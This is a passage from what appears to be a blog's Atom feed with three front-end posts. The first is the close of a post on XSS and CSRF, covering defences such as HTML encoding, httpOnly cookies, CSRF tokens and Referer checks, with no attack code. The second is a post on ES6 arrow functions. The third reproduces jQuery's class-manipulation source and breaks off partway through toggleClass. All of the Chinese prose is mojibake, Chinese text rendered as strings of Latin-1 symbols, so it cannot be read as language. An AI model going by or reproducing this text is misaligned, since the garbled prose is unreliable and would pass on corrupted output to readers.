<code>style</code>èŠ‚ç‚¹ï¼Œ<code>script</code>èŠ‚ç‚¹ï¼Œ<code>iframe</code>èŠ‚ç‚¹ç­‰ã€‚</li><li>å¯¹ç”¨æˆ·è¾“å…¥çš„ä»£ç æ ‡ç­¾è¿›è¡Œè½¬æ¢(html encode)ã€‚</li><li>å¯¹urlä¸­çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ã€‚</li><li>å¯¹åŠ¨æ€è¾“å‡ºåˆ°é¡µé¢çš„å†…å®¹è¿›è¡ŒHTMLç¼–ç ã€‚</li><li>æœåŠ¡ç«¯å¯¹æ•æ„Ÿçš„ <code>Cookie</code> è®¾ç½® <code>httpOnly</code> å±æ€§ï¼Œä½¿jsè„šæœ¬ä¸èƒ½è¯»å–åˆ° <code>cookie</code>ã€‚</li></ul><p><strong>é¢˜å¤–è¯ï¼š</strong><br>ç›®å‰å¾ˆå¤šæµè§ˆå™¨éƒ½ä¼šè‡ªèº«å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œåˆ¤æ–­ï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨æ”»å‡»å­—ç¬¦ï¼Œæ¯”å¦‚ä½ ä¸Šè¿°æåˆ°çš„ <code>script</code> æ ‡ç­¾ï¼Œè¿™æ®µè„šæœ¬å¾ˆæ˜æ˜¾å°±æ˜¯ä¸€æ®µXSSæ”»å‡»ï¼Œå› æ­¤æµè§ˆå™¨ä¼šå¯¹è¿™æ®µè¾“å…¥è¿›è¡Œå¤„ç†ï¼Œä¸åŒçš„æµè§ˆå™¨å¤„ç†æ–¹å¼ä¹Ÿä¸ä¸€æ ·ã€‚</p><h3 id="CSRF-XSRF-çš„è¿‡ç¨‹"><a href="#CSRF-XSRF-çš„è¿‡ç¨‹" class="headerlink" title="CSRF(XSRF)çš„è¿‡ç¨‹"></a>CSRF(XSRF)çš„è¿‡ç¨‹</h3><p><strong>Example:</strong></p><ul><li>ç”¨æˆ·å°æ˜åœ¨ä½ çš„ç½‘ç«™Aä¸Šé¢ç™»å½•äº†ï¼ŒAè¿”å›äº†ä¸€ä¸ª <code>session ID</code> (ä½¿ç”¨cookieå­˜å‚¨)ã€‚</li><li>å°æ˜çš„æµè§ˆå™¨ä¿æŒç€Aç½‘ç«™çš„ç™»å½•çŠ¶æ€ï¼Œæ”»å‡»è€…å°å¼ºç»™å°æ˜å‘é€äº†ä¸€ä¸ªé“¾æ¥åœ°å€ã€‚</li><li>å°æ˜æ‰“å¼€äº†åœ°å€çš„æ—¶å€™ï¼Œè¿™ä¸ªé¡µé¢å·²ç»è‡ªåŠ¨çš„å¯¹ç½‘ç«™aå‘é€äº†ä¸€ä¸ªè¯·æ±‚ã€‚</li><li>é€šè¿‡ä½¿ç”¨å°æ˜çš„cookieä¿¡æ¯ï¼Œè¿™æ ·æ”»å‡»è€…å°å¼ºå°±å¯ä»¥éšæ„æ›´æ”¹å°æ˜åœ¨Aä¸Šçš„ä¿¡æ¯ã€‚</li></ul><h3 id="CSRF-XSRF-çš„é˜²èŒƒ"><a href="#CSRF-XSRF-çš„é˜²èŒƒ" class="headerlink" title="CSRF(XSRF)çš„é˜²èŒƒ"></a>CSRF(XSRF)çš„é˜²èŒƒ</h3><ul><li><p><strong>ä½¿ç”¨tokenï¼š</strong> æœåŠ¡å™¨éšæœºäº§ç”Ÿ <code>tooken</code>ï¼Œç„¶åä»¥ <code>tookenä¸ºç§˜é’¥äº§ç”Ÿä¸€æ®µå¯†æ–‡</code>ï¼ŒæŠŠ <code>tokenå’Œå¯†æ–‡</code> éƒ½éš <code>cookie</code> äº¤ç»™å‰ç«¯ï¼Œå‰ç«¯å‘èµ·è¯·æ±‚æ—¶æŠŠ <code>å¯†æ–‡å’Œtoken</code> äº¤ç»™åç«¯çœ‹ <code>token</code> èƒ½ä¸èƒ½ç”ŸæˆåŒæ ·çš„å¯†æ–‡ï¼Œè¿™æ ·å³ä½¿é»‘å®¢æ‹¿åˆ°äº† <code>token</code> ä¹Ÿæ— æ³•æ‹¿åˆ°å¯†æ–‡ã€‚</p></li><li><p><strong>ä½¿ç”¨éªŒè¯ç ï¼š</strong> æ¯ä¸€ä¸ªé‡è¦çš„ <code>post</code> æäº¤é¡µé¢ï¼Œä½¿ç”¨ä¸€ä¸ªéªŒè¯ç ï¼Œå› ä¸ºç¬¬ä¸‰æ–¹ç½‘ç«™æ˜¯æ— æ³•è·å¾—éªŒè¯ç çš„ã€‚</p></li><li><p><strong>æ£€æµ‹httpçš„å¤´ä¿¡æ¯referï¼š</strong> <code>Referer</code> è®°å½•äº†è¯·æ±‚çš„æ¥æºåœ°å€ï¼ŒæœåŠ¡å™¨å¯ä»¥éªŒè¯è¿™ä¸ªæ¥æºåœ°å€æ˜¯å¦åˆæ³•ã€‚</p></li><li><p><strong>æ›´æ”¹è¯·æ±‚æ–¹å¼ï¼š</strong> æ¶‰åŠæ•æ„Ÿæ“ä½œçš„è¯·æ±‚æ”¹ä¸º <code>POST</code> è¯·æ±‚ã€‚</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XSSå’ŒCSRF(XSRF)éƒ½å±äºè·¨ç«™æ”»å‡»ï¼ŒXSSæ˜¯å®ç°CSRF(XSRF)è¯¸å¤šé€”å¾„ä¸­çš„ä¸€æ¡ï¼Œä½†ä¸æ˜¯å”¯ä¸€ä¸€æ¡ã€‚&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ç®­å¤´å‡½æ•°</title>
    <link href="https://github.com/TheNightElf/2018/01/03/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/"/>
    <id>https://github.com/TheNightElf/2018/01/03/ç®­å¤´å‡½æ•°/</id>
    <published>2018-01-03T07:55:59.000Z</published>
    <updated>2018-01-03T08:44:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>ç†Ÿæ‚‰åç«¯çš„äººå¯¹äºç®­å¤´å‡½æ•°åº”è¯¥ä¸ä¼šé™Œç”Ÿï¼Œåœ¨ <code>C#</code> ä¸­å®ƒå«åš <code>Lambdaè¡¨è¾¾å¼</code>ï¼Œå…¶ä»–çš„åç«¯è¯­è¨€ä¸­ä¹Ÿä¸€ç›´éƒ½æœ‰ä»–çš„èº«å½±ã€‚<br>ç®­å¤´å‡½æ•°æ˜¯ES6æ–°åŠ å…¥çš„ä¸€ä¸ªé‡è¦ç‰¹æ€§ï¼Œå®ƒç®€æ´æ˜äº†çš„ä¹¦å†™æ–¹å¼å¤§å¤§çš„ç®€åŒ–äº†æˆ‘ä»¬å¹³æ—¶ä»£ç ã€‚ä¸‹é¢æˆ‘ä»¬çœ‹ä¸€ä¸‹ç®­å¤´å‡½æ•°çš„ç‰¹æ€§ã€‚<br><a id="more"></a></p><h3 id="ç®­å¤´å‡½æ•°çš„ç‰¹æ€§"><a href="#ç®­å¤´å‡½æ•°çš„ç‰¹æ€§" class="headerlink" title="ç®­å¤´å‡½æ•°çš„ç‰¹æ€§"></a>ç®­å¤´å‡½æ•°çš„ç‰¹æ€§</h3><ul><li>è‡ªåŠ¨è¿”å›</li><li>ä¸ä¼šç»‘å®šè‡ªå·±çš„ <code>this</code></li><li>ä¹¦å†™æ›´åŠ æ–¹ä¾¿</li><li>ä¸ä¼šç»‘å®š <code>arguments</code></li><li>æ— æ³•ä½¿ç”¨ <code>prototype</code></li><li>æ— æ³•ä½¿ç”¨ <code>new</code> å…³é”®å­—</li></ul><h3 id="è‡ªåŠ¨è¿”å›"><a href="#è‡ªåŠ¨è¿”å›" class="headerlink" title="è‡ªåŠ¨è¿”å›"></a>è‡ªåŠ¨è¿”å›</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å†™æ³•ä¸€</span></span><br><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="params">a</span> =&gt;</span> a + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å†™æ³•äºŒ</span></span><br><span class="line"><span class="keyword">var</span> fn2 = <span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b</span><br><span class="line"></span><br><span class="line"><span class="comment">// å†™æ³•ä¸‰</span></span><br><span class="line"><span class="keyword">var</span> fn3 = <span class="function">(<span class="params">a, b</span>) =&gt;</span> (a + b)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å†™æ³•å››</span></span><br><span class="line"><span class="keyword">var</span> fn4 = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ <code>å‚æ•°</code> åªæœ‰ä¸€ä¸ªçš„æ—¶å€™ï¼Œå¯ä»¥çœç•¥å‚æ•°å¤–é¢çš„ <code>()</code>;<br>å½“å‡½æ•°çš„è¡¨è¾¾å¼åªæœ‰ä¸€å¥æ—¶ï¼Œå¯ä»¥ç›´æ¥ä¹¦å†™åœ¨ <code>=&gt;</code> åé¢ï¼Œè¡¨ç¤ºè¿”å›è¯¥è¡¨è¾¾å¼ï¼›ä¹Ÿå¯ä»¥åœ¨è¡¨è¾¾å¼å¤–åŠ ä¸Šä¸€å¯¹ <code>()</code>è¿”å›ï¼Œä¸€èˆ¬ç”¨äºè¿”å› <code>å­—é¢é‡</code> å’Œ <code>æå‡ä¼˜å…ˆçº§</code>ã€‚<br>å¦‚æœé€»è¾‘å¤„ç†è¿‡é•¿ï¼Œåˆ™ä½¿ç”¨ <code>å†™æ³•å››</code> ä¹¦å†™ï¼Œè¯¥å†™æ³•ä¸ä¼šè‡ªåŠ¨è¿”å›ï¼Œéœ€æ‰‹åŠ¨æŒ‡å®šè¿”å›å†…å®¹ã€‚</p><h3 id="ä¸ä¼šç»‘å®šè‡ªå·±çš„-this"><a href="#ä¸ä¼šç»‘å®šè‡ªå·±çš„-this" class="headerlink" title="ä¸ä¼šç»‘å®šè‡ªå·±çš„ this"></a>ä¸ä¼šç»‘å®šè‡ªå·±çš„ <code>this</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.onclick = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="keyword">this</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// this =&gt; window</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this =&gt; body</span></span><br></pre></td></tr></table></figure><h3 id="ä¸ä¼šç»‘å®š-arguments"><a href="#ä¸ä¼šç»‘å®š-arguments" class="headerlink" title="ä¸ä¼šç»‘å®š arguments"></a>ä¸ä¼šç»‘å®š <code>arguments</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="built_in">arguments</span> = <span class="string">'arguments'</span>;</span><br><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="built_in">arguments</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// arguments =&gt; 'arguments'</span></span><br></pre></td></tr></table></figure><h3 id="æ— æ³•ä½¿ç”¨-prototype"><a href="#æ— æ³•ä½¿ç”¨-prototype" class="headerlink" title="æ— æ³•ä½¿ç”¨ prototype"></a>æ— æ³•ä½¿ç”¨ <code>prototype</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'fn'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(fn.prototype)</span><br><span class="line"><span class="comment">// fn.prototype =&gt; undefined</span></span><br><span class="line"><span class="comment">// ç®­å¤´å‡½æ•°æ²¡æœ‰ prototype åŸå‹é“¾</span></span><br></pre></td></tr></table></figure><h3 id="æ— æ³•ä½¿ç”¨-new-å…³é”®å­—"><a href="#æ— æ³•ä½¿ç”¨-new-å…³é”®å­—" class="headerlink" title="æ— æ³•ä½¿ç”¨ new å…³é”®å­—"></a>æ— æ³•ä½¿ç”¨ <code>new</code> å…³é”®å­—</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'fn'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> fn()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Uncaught TypeError: fn is not a constructor</span></span><br><span class="line"><span class="comment">// å‡½æ•° fn ä¸æ˜¯ä¸€ä¸ªæ„é€ å™¨</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå°±æ˜¯ç®­å¤´å‡½æ•°çš„æ‰€æœ‰ç‰¹æ€§äº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç†Ÿæ‚‰åç«¯çš„äººå¯¹äºç®­å¤´å‡½æ•°åº”è¯¥ä¸ä¼šé™Œç”Ÿï¼Œåœ¨ &lt;code&gt;C#&lt;/code&gt; ä¸­å®ƒå«åš &lt;code&gt;Lambdaè¡¨è¾¾å¼&lt;/code&gt;ï¼Œå…¶ä»–çš„åç«¯è¯­è¨€ä¸­ä¹Ÿä¸€ç›´éƒ½æœ‰ä»–çš„èº«å½±ã€‚&lt;br&gt;ç®­å¤´å‡½æ•°æ˜¯ES6æ–°åŠ å…¥çš„ä¸€ä¸ªé‡è¦ç‰¹æ€§ï¼Œå®ƒç®€æ´æ˜äº†çš„ä¹¦å†™æ–¹å¼å¤§å¤§çš„ç®€åŒ–äº†æˆ‘ä»¬å¹³æ—¶ä»£ç ã€‚ä¸‹é¢æˆ‘ä»¬çœ‹ä¸€ä¸‹ç®­å¤´å‡½æ•°çš„ç‰¹æ€§ã€‚&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ç°ä»£æµè§ˆå™¨çš„ç±»åæ“ä½œ</title>
    <link href="https://github.com/TheNightElf/2017/12/27/%E7%8E%B0%E4%BB%A3%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%B1%BB%E5%90%8D%E6%93%8D%E4%BD%9C/"/>
    <id>https://github.com/TheNightElf/2017/12/27/ç°ä»£æµè§ˆå™¨çš„ç±»åæ“ä½œ/</id>
    <published>2017-12-27T03:25:53.000Z</published>
    <updated>2017-12-27T04:35:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨å‰ç«¯ <code>MV*</code> æ¡†æ¶è¿˜æœªå…´èµ·çš„æ—¶æœŸï¼Œç»å¤§éƒ¨åˆ†çš„å‰ç«¯ç½‘ç«™éƒ½æ˜¯åŸºäº <code>äº‹ä»¶é©±åŠ¨</code> çš„ã€‚è€Œè¿™ç§ç½‘ç«™æ€»æ˜¯ä¸å¯é¿å…çš„ä¼´éšç€å¤§é‡çš„ <code>DOMæ“ä½œ</code>ã€‚å…¶ä¸­ï¼Œ<code>ç±»å - class</code> çš„æ“ä½œç®—æ˜¯å…¶ä¸­æœ€å¹³å¸¸ä¹Ÿæ˜¯æœ€æ–¹ä¾¿ã€é€šç”¨çš„ä¸€ç§ã€‚</p><a id="more"></a><h3 id="ç±»åæ“ä½œ"><a href="#ç±»åæ“ä½œ" class="headerlink" title="ç±»åæ“ä½œ"></a>ç±»åæ“ä½œ</h3><p>è¯´èµ·ç±»åæ“ä½œï¼Œå¤§éƒ¨åˆ†äººçš„ç¬¬ä¸€ååº”å°±æ˜¯ <code>jquery</code> ä¸­çš„ <code>addClassã€removeClassã€hasClassã€toggleClass</code> è¿™å‡ ä¸ªç»„åˆäº†ã€‚<br>ä¸‹é¢æˆ‘ä»¬çœ‹ä¸‹ <code>jquery</code> æºç ä¸­æ˜¯æ€ä¹ˆå®ç°çš„ã€‚</p><h4 id="addClass"><a href="#addClass" class="headerlink" title="addClass"></a>addClass</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// addClass</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addClass</span>(<span class="params"> value </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> classes, elem, cur, curValue, clazz, j, finalValue,</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( jQuery.isFunction( value ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.each( <span class="function"><span class="keyword">function</span>(<span class="params"> j </span>) </span>&#123;</span><br><span class="line">            jQuery( <span class="keyword">this</span> ).addClass( value.call( <span class="keyword">this</span>, j, getClass( <span class="keyword">this</span> ) ) );</span><br><span class="line">        &#125; );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">typeof</span> value === <span class="string">"string"</span> &amp;&amp; value ) &#123;</span><br><span class="line">        classes = value.match( rnothtmlwhite ) || [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ( ( elem = <span class="keyword">this</span>[ i++ ] ) ) &#123;</span><br><span class="line">            curValue = getClass( elem );</span><br><span class="line">            cur = elem.nodeType === <span class="number">1</span> &amp;&amp; ( <span class="string">" "</span> + stripAndCollapse( curValue ) + <span class="string">" "</span> );</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( cur ) &#123;</span><br><span class="line">                j = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> ( ( clazz = classes[ j++ ] ) ) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( cur.indexOf( <span class="string">" "</span> + clazz + <span class="string">" "</span> ) &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">                        cur += clazz + <span class="string">" "</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Only assign if different to avoid unneeded rendering.</span></span><br><span class="line">                finalValue = stripAndCollapse( cur );</span><br><span class="line">                <span class="keyword">if</span> ( curValue !== finalValue ) &#123;</span><br><span class="line">                    elem.setAttribute( <span class="string">"class"</span>, finalValue );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="removeClass"><a href="#removeClass" class="headerlink" title="removeClass"></a>removeClass</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// removeClass </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeClass</span>(<span class="params"> value </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> classes, elem, cur, curValue, clazz, j, finalValue,</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( jQuery.isFunction( value ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.each( <span class="function"><span class="keyword">function</span>(<span class="params"> j </span>) </span>&#123;</span><br><span class="line">            jQuery( <span class="keyword">this</span> ).removeClass( value.call( <span class="keyword">this</span>, j, getClass( <span class="keyword">this</span> ) ) );</span><br><span class="line">        &#125; );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">arguments</span>.length ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.attr( <span class="string">"class"</span>, <span class="string">""</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">typeof</span> value === <span class="string">"string"</span> &amp;&amp; value ) &#123;</span><br><span class="line">        classes = value.match( rnothtmlwhite ) || [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ( ( elem = <span class="keyword">this</span>[ i++ ] ) ) &#123;</span><br><span class="line">            curValue = getClass( elem );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// This expression is here for better compressibility (see addClass)</span></span><br><span class="line">            cur = elem.nodeType === <span class="number">1</span> &amp;&amp; ( <span class="string">" "</span> + stripAndCollapse( curValue ) + <span class="string">" "</span> );</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( cur ) &#123;</span><br><span class="line">                j = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> ( ( clazz = classes[ j++ ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Remove *all* instances</span></span><br><span class="line">                    <span class="keyword">while</span> ( cur.indexOf( <span class="string">" "</span> + clazz + <span class="string">" "</span> ) &gt; <span class="number">-1</span> ) &#123;</span><br><span class="line">                        cur = cur.replace( <span class="string">" "</span> + clazz + <span class="string">" "</span>, <span class="string">" "</span> );</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Only assign if different to avoid unneeded rendering.</span></span><br><span class="line">                finalValue = stripAndCollapse( cur );</span><br><span class="line">                <span class="keyword">if</span> ( curValue !== finalValue ) &#123;</span><br><span class="line">                    elem.setAttribute( <span class="string">"class"</span>, finalValue );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="hasClass"><a href="#hasClass" class="headerlink" title="hasClass"></a>hasClass</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hasClass</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasClass</span>(<span class="params"> selector </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> className, elem,</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    className = <span class="string">" "</span> + selector + <span class="string">" "</span>;</span><br><span class="line">    <span class="keyword">while</span> ( ( elem = <span class="keyword">this</span>[ i++ ] ) ) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( elem.nodeType === <span class="number">1</span> &amp;&amp;</span><br><span class="line">            ( <span class="string">" "</span> + stripAndCollapse( getClass( elem ) ) + <span class="string">" "</span> ).indexOf( className ) &gt; <span class="number">-1</span> ) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="toggleClass"><a href="#toggleClass" class="headerlink" title="toggleClass"></a>toggleClass</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// toggleClass </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toggleClass</span>(<span class="params"> value, stateVal </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> type = <span class="keyword">typeof</span> value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">typeof</span> stateVal === <span class="string">"boolean"</span> &amp;&amp; type === <span class="string">"string"</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> stateVal ? <span class="keyword">this</span>.addClass( value ) : <span class="keyword">this</span>.removeClass( value );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( jQuery.isFunction( value ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.each( <span class="function"><span class="keyword">function</span>(<span class="params"> i </span>) </span>&#123;</span><br><span class="line">            jQuery( <span class="keyword">this</span> ).toggleClass(</span><br><span class="line">                value.call( <span class="keyword">this</span>, i, getClass( <span class="keyword">this</span> ), stateVal ),</span><br><span class="line">                stateVal</span><br><span class="line">            );</span><br><span class="line">        &#125; );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.each( <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> className, i, self, classNames;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( type === <span class="string">"string"</span> ) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Toggle individual class names</span></span><br><span class="line">            i = <span class="number">0</span>;</span><br><span class="line">            self = jQuery( <span class="keyword">this</span> );</span><br><span class="line">            classNames = value.match( rnothtmlwhite ) || [];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ( ( className = classNames[ i++ ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check each className given, space 